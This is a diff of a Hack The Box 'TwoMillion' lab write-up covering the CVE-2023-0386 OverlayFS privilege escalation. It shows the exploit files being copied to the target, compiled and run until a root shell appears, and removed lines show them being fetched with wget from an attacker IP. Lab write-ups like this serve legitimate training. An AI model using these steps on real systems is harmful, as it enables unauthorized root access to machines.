@@ -897,67 +897,139 @@ exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
 
 ```
 
+<img width="625" height="698" alt="image" src="https://github.com/user-attachments/assets/66168fa2-6522-43d4-acbe-427650b390f9" />
+
+
+
 ``` bash
 
-❯ python3 -m http.server 9090
+❯ scp -r CVE-2023-0386/ admin@2million.htb:/home/admin/
+admin@2million.htb's password:
+.gitkeep                                                                              100%    0     0.0KB/s   00:00
+getshell.c                                                                            100%  549    13.7KB/s   00:00
+exp.c                                                                                 100% 3093    77.7KB/s   00:00
+fuse.c                                                                                100% 5616   133.3KB/s   00:00
+description                                                                           100%   73     1.9KB/s   00:00
+main                                                                                  100%  200     5.0KB/s   00:00
+HEAD                                                                                  100%  200     5.2KB/s   00:00
+HEAD                                                                                  100%  200     5.1KB/s   00:00
+index                                                                                 100%  805    19.1KB/s   00:00
+exclude                                                                               100%  240     6.2KB/s   00:00
+packed-refs                                                                           100%  112     2.9KB/s   00:00
+push-to-checkout.sample                                                               100% 2783    70.9KB/s   00:00
+pre-merge-commit.sample                                                               100%  416    11.0KB/s   00:00
+pre-commit.sample                                                                     100% 1649    41.4KB/s   00:00
+sendemail-validate.sample                                                             100% 2308    54.9KB/s   00:00
+commit-msg.sample                                                                     100%  896    10.2KB/s   00:00
+prepare-commit-msg.sample                                                             100% 1492    35.0KB/s   00:00
+pre-rebase.sample                                                                     100% 4898   118.9KB/s   00:00
+pre-applypatch.sample                                                                 100%  424    10.8KB/s   00:00
+update.sample                                                                         100% 3650    92.6KB/s   00:00
+applypatch-msg.sample                                                                 100%  478    12.5KB/s   00:00
+pre-push.sample                                                                       100% 1374    34.7KB/s   00:00
+fsmonitor-watchman.sample                                                             100% 4726   112.4KB/s   00:00
+pre-receive.sample                                                                    100%  544    14.0KB/s   00:00
+post-update.sample                                                                    100%  189     4.8KB/s   00:00
+main                                                                                  100%   41     1.1KB/s   00:00
+HEAD                                                                                  100%   30     0.8KB/s   00:00
+pack-a46e1f432d14a41fbfe09d64990b4dc3c42c3748.idx                                     100% 2164    51.5KB/s   00:00
+pack-a46e1f432d14a41fbfe09d64990b4dc3c42c3748.pack                                    100%  430KB   1.6MB/s   00:00
+pack-a46e1f432d14a41fbfe09d64990b4dc3c42c3748.rev                                     100%  208     5.4KB/s   00:00
+config                                                                                100%  265     6.6KB/s   00:00
+HEAD                                                                                  100%   21     0.5KB/s   00:00
+mnt                                                                                   100%   16KB 403.6KB/s   00:00
+mnt.c                                                                                 100% 1565    39.8KB/s   00:00
+fuse_test.c                                                                           100%   10KB 265.9KB/s   00:00
+Makefile                                                                              100%  150     3.9KB/s   00:00
+README.md                                                                             100%  586    15.1KB/s   00:00
+╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                 ✔ │ 29s ─╮
+╰─                                                                                                                   ─╯
+```
 
-Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
-10.129.229.66 - - [30/Jul/2026 03:47:59] "GET /exp.c HTTP/1.1" 200 -
-10.129.229.66 - - [30/Jul/2026 03:48:09] "GET /fuse.c HTTP/1.1" 200 -
-10.129.229.66 - - [30/Jul/2026 03:48:20] "GET /getshell.c HTTP/1.1" 200 -
-10.129.229.66 - - [30/Jul/2026 03:48:36] "GET /Makefile HTTP/1.1" 200 -
+
+
+``` bash
+
+admin@2million:~$ cd CVE-2023-0386/
+admin@2million:~/CVE-2023-0386$ ls
+exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
+admin@2million:~/CVE-2023-0386$ make all
+gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
+fuse.c: In function ‘read_buf_callback’:
+fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
+  106 |     printf("offset %d\n", off);
+      |                    ~^     ~~~
+      |                     |     |
+      |                     int   off_t {aka long int}
+      |                    %ld
+fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
+  107 |     printf("size %d\n", size);
+      |                  ~^     ~~~~
+      |                   |     |
+      |                   int   size_t {aka long unsigned int}
+      |                  %ld
+fuse.c: In function ‘main’:
+fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
+  214 |     while (read(fd, content + clen, 1) > 0)
+      |            ^~~~
+      |            fread
+fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaratio]
+  216 |     close(fd);
+      |     ^~~~~
+      |     pclose
+fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
+  221 |     rmdir(mount_path);
+      |     ^~~~~
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
+(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
+gcc -o exp exp.c -lcap
+gcc -o gc getshell.c
+admin@2million:~/CVE-2023-0386$
+
+```
+
+``` bash
+
+admin@2million:~/CVE-2023-0386$
+admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
+[+] len of gc: 0x3ee0
+[+] readdir
+[+] getattr_callback
+/file
+[+] open_callback
+/file
+[+] read buf callback
+offset 0
+size 16384
+path /file
+[+] open_callback
+/file
+[+] open_callback
+/file
+[+] ioctl callback
+path /file
+cmd 0x80086601
 
 
 ```
 
 ``` bash
 
-admin@2million:~$ mkdir CVE
-admin@2million:~$ cd CVE/
-admin@2million:~/CVE$ wget http://10.10.15.242:9090/exp.c
---2026-07-30 01:47:46--  http://10.10.15.242:9090/exp.c
-Connecting to 10.10.15.242:9090... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3093 (3.0K) [text/x-csrc]
-Saving to: ‘exp.c’
+admin@2million:~$ cd CVE-2023-0386/
+admin@2million:~/CVE-2023-0386$ ./exp
+uid:1000 gid:1000
+[+] mount success
+total 8
+drwxrwxr-x 1 root   root     4096 Jul 30 01:54 .
+drwxr-xr-x 6 root   root     4096 Jul 30 01:54 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] exploit success!
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
 
-exp.c                         100%[=================================================>]   3.02K  --.-KB/s    in 0.001s
-
-2026-07-30 01:47:46 (2.77 MB/s) - ‘exp.c’ saved [3093/3093]
-
-admin@2million:~/CVE$ wget http://10.10.15.242:9090/fuse.c
---2026-07-30 01:47:56--  http://10.10.15.242:9090/fuse.c
-Connecting to 10.10.15.242:9090... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 5616 (5.5K) [text/x-csrc]
-Saving to: ‘fuse.c’
-
-fuse.c                        100%[=================================================>]   5.48K  --.-KB/s    in 0.001s
-
-2026-07-30 01:47:56 (10.0 MB/s) - ‘fuse.c’ saved [5616/5616]
-
-admin@2million:~/CVE$ wget http://10.10.15.242:9090/getshell.c
---2026-07-30 01:48:07--  http://10.10.15.242:9090/getshell.c
-Connecting to 10.10.15.242:9090... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 549 [text/x-csrc]
-Saving to: ‘getshell.c’
-
-getshell.c                    100%[=================================================>]     549  --.-KB/s    in 0s
-
-2026-07-30 01:48:07 (69.6 MB/s) - ‘getshell.c’ saved [549/549]
-
-admin@2million:~/CVE$ wget http://10.10.15.242:9090/Makefile
---2026-07-30 01:48:23--  http://10.10.15.242:9090/Makefile
-Connecting to 10.10.15.242:9090... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 150 [application/octet-stream]
-Saving to: ‘Makefile’
-
-Makefile                      100%[=================================================>]     150  --.-KB/s    in 0s
-
-2026-07-30 01:48:23 (22.0 MB/s) - ‘Makefile’ saved [150/150]
-
-admin@2million:~/CVE$
+root@2million:~/CVE-2023-0386# id
+uid=0(root) gid=0(root) groups=0(root),1000(admin)
+root@2million:~/CVE-2023-0386#
 
 ```
+
